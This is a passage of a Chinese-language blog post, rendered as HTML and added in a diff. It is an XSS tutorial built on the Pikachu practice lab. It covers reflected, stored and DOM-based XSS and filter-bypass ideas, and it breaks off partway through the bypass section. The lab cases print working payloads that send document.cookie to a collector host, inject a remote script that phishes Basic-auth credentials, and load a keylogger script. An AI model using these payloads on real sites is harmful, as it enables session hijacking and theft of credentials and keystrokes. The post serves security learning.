@@ -1,0 +1,409 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS跨站脚本 | RJ の 博客</title><meta name="author" content="Rui Ji"><meta name="copyright" content="Rui Ji"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="一.XSS（跨站脚本）概述 Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：			  反射性XSS; 存储型XSS; DOM型XSS;   XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。 XSS是一种发生在前端浏览器端的漏洞，所以其危">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站脚本">
+<meta property="og:url" content="http://ruijiluo.github.io/2023/12/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/index.html">
+<meta property="og:site_name" content="RJ の 博客">
+<meta property="og:description" content="一.XSS（跨站脚本）概述 Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：			  反射性XSS; 存储型XSS; DOM型XSS;   XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。 XSS是一种发生在前端浏览器端的漏洞，所以其危">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/12/20/4dJUfz6p5ygLsZu.png">
+<meta property="article:published_time" content="2023-12-20T12:57:43.000Z">
+<meta property="article:modified_time" content="2024-04-10T14:44:32.861Z">
+<meta property="article:author" content="Rui Ji">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/12/20/4dJUfz6p5ygLsZu.png"><link rel="shortcut icon" href="https://s2.loli.net/2023/09/07/hRcHvbPo15QmB7T.png"><link rel="canonical" href="http://ruijiluo.github.io/2023/12/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS跨站脚本',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-10 22:44:32'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="./themes/butterfly/source/css/bg_color.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2023/12/20/4dJUfz6p5ygLsZu.png')"><nav id="nav"><span id="blog-info"><a href="/" title="RJ の 博客"><span class="site-name">RJ の 博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS跨站脚本</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-20T12:57:43.000Z" title="发表于 2023-12-20 20:57:43">2023-12-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-10T14:44:32.861Z" title="更新于 2024-04-10 22:44:32">2024-04-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS跨站脚本"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="一-XSS（跨站脚本）概述"><a href="#一-XSS（跨站脚本）概述" class="headerlink" title="一.XSS（跨站脚本）概述"></a>一.XSS（跨站脚本）概述</h4><ul>
+<li><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：			</p>
+<ol>
+<li>反射性XSS;</li>
+<li>存储型XSS;</li>
+<li>DOM型XSS;</li>
+</ol>
+</li>
+<li><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</p>
+<p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p>
+</li>
+<li><p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。 因 此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:</p>
+<ul>
+<li><p><strong>输入过滤</strong>：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</p>
+</li>
+<li><p><strong>输出转义</strong>：根据输出点的位置对输出到前端的内容进行适当转义;</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="二-XSS常见类型-基于Pikachu"><a href="#二-XSS常见类型-基于Pikachu" class="headerlink" title="二.XSS常见类型(基于Pikachu)"></a>二.XSS常见类型(基于Pikachu)</h4><h5 id="1-反射型xss"><a href="#1-反射型xss" class="headerlink" title="1.反射型xss"></a>1.反射型xss</h5><ul>
+<li><p>攻击者通过向用户提交的数据中注入恶意脚本，通过用户请求的参数传递给服务器，并且服务器将其反射回给用户，最终在用户的浏览器上执行。</p>
+<p>​                                                                                                  <img src="https://s2.loli.net/2023/12/19/So5zpahN7ZPIQxj.png" alt="image-20231219172341941"></p>
+<ul>
+<li><p>通过输入测试字符串 <strong>‘“&lt;&gt;test</strong> 对回显观察发现特殊字符没有被过滤<br>                                                                                <img src="https://s2.loli.net/2023/12/19/G6sv4rUqZDlmxwo.png" alt="image-20231219173004011"></p>
+</li>
+<li><p>通过查看页面源码可以以发现前端通过get的方式将表单数据提交到后端</p>
+<p>​                                            <img src="https://s2.loli.net/2023/12/19/5t6Qu9kH3XPgzqw.png">   </p>
+</li>
+<li><p>通过浏览器控制台将maxlength改为1000,并在输入框输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>后点击即可执行<strong>js</strong>代码</p>
+<p>​                                    	<img src="https://s2.loli.net/2023/12/19/TjS3PRWn2J1OZDA.png" alt="image-20231219175640391" style="zoom:133%;" /> 			</p>
+</li>
+<li><p>通过查看靶场源码,可以发现后端未对_GET[‘message’]进行过滤,并直接通过echo $html输出到前端,可以进行反射型XSS攻击</p>
+<p>​                                            <img src="https://s2.loli.net/2023/12/19/oa4liDjv3TfOupK.png" alt="image-20231219180438953" style="zoom: 56%;" />   </p>
+<img src="https://s2.loli.net/2023/12/19/oNyMrdcOHk7GSbv.png" alt="image-20231219181202500" style="zoom:64%;" />
+
+
+</li>
+<li><p>同时通过get方式提交表单可以将带有<strong>js</strong>的url进行钓鱼,受害者点击url后执行<strong>js</strong></p>
+<p>​                   <img src="https://s2.loli.net/2023/12/19/2jgLGSl56mYoZdv.png" alt="image-20231219184755602"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="2-存储型xss"><a href="#2-存储型xss" class="headerlink" title="2.存储型xss"></a>2.存储型xss</h5><ul>
+<li><p>攻击者通常通过提交包含恶意脚本的数据或文件，将其存储在目标网站的数据库中。当其他用户访问包含恶意脚本的页面时，这些脚本会从服务器上提取并在用户的浏览器中执行。</p>
+<p><img src="https://s2.loli.net/2023/12/19/9aIhvo2zK4H6gX8.png" alt="image-20231219185035841"></p>
+<ul>
+<li><p>通过输入测试字符串 <strong>‘“&lt;&gt;test</strong> 对回显观察发现特殊字符没有被过滤</p>
+<p><img src="https://s2.loli.net/2023/12/19/u9naosLcI2OUNfD.png" alt="image-20231219185106687"></p>
+</li>
+<li><p>输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>后点击submit,浏览器弹出弹窗,<strong>js</strong>代码被执行</p>
+<img src="https://s2.loli.net/2023/12/19/OcUt4XYko3BLQZa.png" alt="image-20231219175640391" style="zoom:133%;" />
+
+
+</li>
+<li><p>刷新页面后浏览器再次弹出弹窗,留言板内容保留,可以判断该页面存在存储型xss漏洞</p>
+<p><img src="https://s2.loli.net/2023/12/19/pfRhqYwG9tDCFLW.png" alt="image-20231219185909657"></p>
+</li>
+<li><p>通过查看靶场源码,可以发现后端未对_GET[‘message’]进行过滤,并构建了一个SQL插入语句，将经过处理的留言内容和当前时间插入到名为 <code>message</code> 的表中。</p>
+<img src="https://s2.loli.net/2023/12/19/URDhaebfJ2m58sO.png" alt="image-20231219190653427" style="zoom:73%;" />
+
+
+</li>
+<li><p>然后后端通过sql查询直接将留言板内容没有过滤直接echo到前端使js脚本被执行</p>
+<img src="https://s2.loli.net/2023/12/19/Enkud4xQVM3GJZR.png" alt="image-20231219191321951" style="zoom: 54%;" /></li>
+</ul>
+</li>
+</ul>
+<h5 id="3-DOM型xss"><a href="#3-DOM型xss" class="headerlink" title="3.DOM型xss"></a>3.DOM型xss</h5><p>- </p>
+<ul>
+<li><p>DOM型XSS并不涉及将恶意脚本插入到服务器返回的HTML中，而是通过修改浏览器的DOM（文档对象模型）来实现攻击。</p>
+<img src="https://s2.loli.net/2023/12/19/Jh1sfZE5eO9QYag.png" alt="image-20231219195145352" style="zoom:113%;" />
+
+
+</li>
+<li><p><strong>普通DOM型xss</strong></p>
+<ul>
+<li>通过输入测试字符串 <strong>‘“&lt;&gt;test</strong> 后查看页面源码发现特殊字符没有被过滤</li>
+</ul>
+<p>​                                        <img src="https://s2.loli.net/2023/12/19/4QRW9ZoLVHDvw5I.png" alt="image-20231219200240148" style="zoom:87%;" /></p>
+<ul>
+<li><p>同时发现 id &#x3D;&#x3D; dom 的<div>中为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&quot;+str+&quot;&#x27;</span>&gt;what <span class="keyword">do</span> you see?&lt;/a&gt;  </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以输入 ‘ onclick&#x3D;alert(‘xss’)  来闭合 href属性并添加onclick属性，实现点击<a>后弹出弹窗                  </p>
+<p>​                        <img src="https://s2.loli.net/2023/12/20/zbyD16fYSkT4vcN.png" alt="image-20231219200849246" style="zoom:65%;" /></p>
+</li>
+</ul>
+</li>
+<li><p><strong>DOM型xss-x</strong></p>
+<ul>
+<li>通过源码可以知道DOM型xss-x的id &#x3D;&#x3D; dom 的<div>中的提取点为url</li>
+</ul>
+<img src="https://s2.loli.net/2023/12/20/WXwQRBpflKTA7mM.png"/>
+
+
+
+<img src="https://s2.loli.net/2023/12/20/2PJHDSwuT1xoEaG.png" alt="image-20231219203143049" style="zoom: 88%;" />
+
+
+
+<ul>
+<li><p>可以通过向被攻击者发送特定的url进行<strong>DOM型xss-x</strong>攻击，例如<a target="_blank" rel="noopener" href="http://192.168.31.203:8083/vul/xss/xss_dom_x.php?text=%27+onclick=alert(%27xss%27)+%EF%BC%8C%E7%94%A8%E6%88%B7%E7%82%B9%E5%87%BB">http://192.168.31.203:8083/vul/xss/xss_dom_x.php?text=&#39;+onclick%3Dalert(&#39;xss&#39;)+，用户点击</a><a>后会执行<strong>js</strong>代码     </p>
+<p>​                       <img src="https://s2.loli.net/2023/12/20/3dRhntu7MpgJkBC.png" alt="image-20231219203641012" style="zoom:67%;" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="三-xss实验案例-基于Pikachu"><a href="#三-xss实验案例-基于Pikachu" class="headerlink" title="三.xss实验案例(基于Pikachu)"></a>三.xss实验案例(基于Pikachu)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- pkxss后台登录页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.1.15/pkxss/pkxss_login.php&quot;</span>&gt;</span>http://192.168.1.15/pkxss/pkxss_login.php<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 模拟的恶意站点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://192.168.1.5/post.html&quot;</span>&gt;</span>http://192.168.1.5/post.html<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="1-通过xss获取cookie及xss管理后台使用"><a href="#1-通过xss获取cookie及xss管理后台使用" class="headerlink" title="1.通过xss获取cookie及xss管理后台使用"></a>1.<strong>通过xss获取cookie及xss管理后台使用</strong></h5><ul>
+<li><p><strong>get方式下xss获取cookie</strong>(页面前端结构与反射型xss中的一样)</p>
+<p><img src="https://s2.loli.net/2023/12/19/IFe9xwCEKVO8L5q.png" alt="image-20231219223505690"></p>
+<p>​                                                   <img src="https://s2.loli.net/2023/12/20/eji5QkubyHYPvKg.png" style="zoom:73%;" />            </p>
+</li>
+<li><p>通过后台源码可以知道<strong>js</strong>脚本要提交cookie</p>
+<p>​                                                   <img src="https://s2.loli.net/2023/12/20/m9hwnQFKMvpbuS7.png" alt="image-20231219222530628" style="zoom:66%;" /></p>
+</li>
+<li><p>构建模拟xss获取cookie的恶意XSS攻击</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 恶意XSS攻击 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;script&gt; 标签： 是HTML中用于包含 JavaScript 代码的标签。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">document.location： 这是JavaScript中的一个对象，代表当前文档的URL。在这里，它被用于导航到一个新的URL。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#x27;http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=&#x27;： 是攻击者准备发送的URL的一部分，其中包含一个PHP脚本（cookie.php），用于接收从用户浏览器中窃取的Cookie信息。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">document.cookie： 是JavaScript 中的一个对象，用于访问当前文档的所有 Cookie。攻击者试图将用户浏览器中的所有 Cookie 数据附加到URL的末尾。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- url编码的xss攻击 --&gt;</span></span><br><span class="line">http://192.168.1.15/vul/xss/xss_reflected_get.php?message=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">+++<span class="variable language_">document</span>.<span class="property">location</span>+%3D+%27http%3A%2F%2F192<span class="number">.168</span><span class="number">.1</span><span class="number">.15</span>%2Fpkxss%2Fxcookie%2Fcookie.<span class="property">php</span>%3Fcookie%3D%<span class="number">27</span>+%2B+<span class="variable language_">document</span>.<span class="property">cookie</span>%3B+&lt;%2Fscript&gt;&amp;submit=submit</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>submit或点击url编码的xss攻击后用户的cookie被pkxss后台获取<br>                                              <img src="https://s2.loli.net/2023/12/20/wxe89PkAXsolcD1.png" alt="image-20231219224424657" style="zoom:80%;" /></p>
+</li>
+</ul>
+<h5 id="2-xss钓鱼-存储型xss"><a href="#2-xss钓鱼-存储型xss" class="headerlink" title="2.xss钓鱼(存储型xss)"></a>2.<strong>xss钓鱼(存储型xss)</strong></h5><ul>
+<li><p><strong>存储型xss钓取用户信息</strong>(页面前端结构与存储型xss中的一样)</p>
+<p><img src="https://s2.loli.net/2023/12/20/R5YapEGzVjLfQPS.png" alt="image-20231219231519637"></p>
+</li>
+<li><p><strong>构建模拟远程脚本注入钓取用户信息的恶意XSS攻击</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 潜在的远程脚本注入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.1.4/pikachu/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;script&gt; 标签： 是HTML中用于包含 JavaScript 代码的标签。</span></span><br><span class="line"><span class="comment">src=&quot;http://192.168.1.4/pikachu/pkxss/xfish/xfish.php&quot;： 是脚本文件的源URL，指向一个位于http://192.168.1.4/pikachu/pkxss/xfish/ 目录下的 PHP 文件（xfish.php）。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通过分析fish.php可知用户进入存储了远程脚本注入钓取用户信息的恶意XSS攻击的网页后，页面生成一个Basic认证，如果用户提交认证后认证信息将被收集，并通过 header(“Location: <a target="_blank" rel="noopener" href="http://192.168.1.15/pkxss/xfish/xfish.php?username=%7B$_SERVER%5BPHP_AUTH_USER%5D%7D">http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}</a><br>&amp;password&#x3D;{$_SERVER[PHP_AUTH_PW]}”；发送到xfish.php后存储到数据库中。</p>
+<img src="https://s2.loli.net/2023/12/20/w9F5kH4iGrpRLPg.png" alt="image-20231219232247985" style="zoom: 69%;" />
+
+
+
+<img src="https://s2.loli.net/2023/12/20/dikTsSxYWLo2Cb7.png" alt="image-20231219233557881" style="zoom:80%;" />
+
+<p>​                                                <img src="https://s2.loli.net/2023/12/20/H3WAcbfumV1Yq84.png" alt="image-20231219233904880" style="zoom:103%;" /></p>
+</li>
+</ul>
+<h5 id="3-xss获取键盘记录"><a href="#3-xss获取键盘记录" class="headerlink" title="3.xss获取键盘记录"></a>3.<strong>xss获取键盘记录</strong></h5><ul>
+<li><p>跨域-同源策略<br>                                                                                       <img src="https://s2.loli.net/2023/12/20/O5uNwkxMLYlEtXU.png" alt="image-20231220000445968" style="zoom: 45%;" />    </p>
+</li>
+<li><p>选择<script src="…">来进行跨域加载js(页面前端结构与反射型xss中的一样),</p>
+<p><img src="https://s2.loli.net/2023/12/20/96MdCa1jztXSmhq.png" alt="image-20231220003000495"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 潜在的远程脚本注入 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.1.15/pkxss/rkeypress/rk.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">rk.js用于在用户按下键盘按键时，将按键信息以Ajax方式发送到远程服务器</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将远程脚本注入后按下键盘按键时，通过浏览器网络工具抓包发现Ajax请求无法跨域</p>
+<img src="https://s2.loli.net/2023/12/20/oiEtSsLm4YRyNnF.png" alt="image-20231220003802097" style="zoom: 86%;" />
+
+
+</li>
+<li><p>通过设置rkserver.php可解决跨域访问</p>
+<p><img src="https://s2.loli.net/2023/12/20/pZuMaQgES6dsWrb.png" alt="image-20231220003917918"></p>
+</li>
+<li><p>解决跨域访问后键入6个 a ，查看pkxss后台，获取成功</p>
+<p><img src="https://s2.loli.net/2023/12/20/kHPBWEsNtQ5Gcvd.png" alt="image-20231220004127983"></p>
+</li>
+</ul>
+<h5 id="4-xss盲打"><a href="#4-xss盲打" class="headerlink" title="4.xss盲打"></a>4.<strong>xss盲打</strong></h5><ul>
+<li><p>盲打（Blind XSS）是一种攻击技术，攻击者通过向目标网站注入恶意脚本，但与传统的XSS攻击不同的是，攻击者无法直接看到或交互地利用漏洞。相反，攻击者通过其他方式间接确认攻击是否成功，通常是通过收集日志、错误信息或其他反馈机制来判断。</p>
+<p><img src="https://s2.loli.net/2023/12/21/QOaCcXjfrM5Bz3n.png" alt="image-20231220233800782"></p>
+</li>
+<li><p>随便输入</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和”’<>666看页面有没有过滤特殊字符,并查看有无回显,发现前端没有储存xss</p>
+<p><img src="C:/Users/86134/AppData/Roaming/Typora/typora-user-images/image-20231220234109793.png" alt="image-20231220234109793"></p>
+</li>
+<li><p>猜测页面后台存储了xss,使用admin_login.php等录后台后,发现js被执行</p>
+<p>​                                                         <img src="https://s2.loli.net/2023/12/21/8PEGOv2wQT51l6o.png" alt="image-20231221000758133" style="zoom:123%;" /></p>
+</li>
+</ul>
+<img src="https://s2.loli.net/2023/12/21/lFRJ4fVL1y96gQh.png" alt="image-20231221000845554" style="zoom:70%;" />
+
+<h5 id="5-xss绕过思路"><a href="#5-xss绕过思路" class="headerlink" title="5.xss绕过思路"></a><strong>5.xss绕过思路</strong></h5><ul>
+<li><p><strong>转换</strong>(  大小写，拼凑，注释)</p>
+<p>​                                                         <img src="https://s2.loli.net/2023/12/21/4XE9eOM5BvjIHJ3.png" alt="image-20231221004113755" style="zoom:74%;" /></p>
+</li>
+<li><p><strong>编码</strong>（html编码）</p>
+<p>​                                                         <img src="https://s2.loli.net/2023/12/21/pdXfWlakMZmhS83.png" alt="image-20231221004253791" style="zoom:62%;" /></p>
+</li>
+<li><p>例子：</p>
+<img src="https://s2.loli.net/2023/12/21/ORZpb8nsVvTciJm.png"/>
+</li>
+<li><p>输入‘“<>test查看是否过滤特殊符号，发现不过滤</p>
+<p><img src="https://s2.loli.net/2023/12/21/O8ugRlQPFy7dnhe.png" alt="image-20231221004648204"></p>
+</li>
+<li><p>尝试注入xss，使用大小写混合后成功</p>
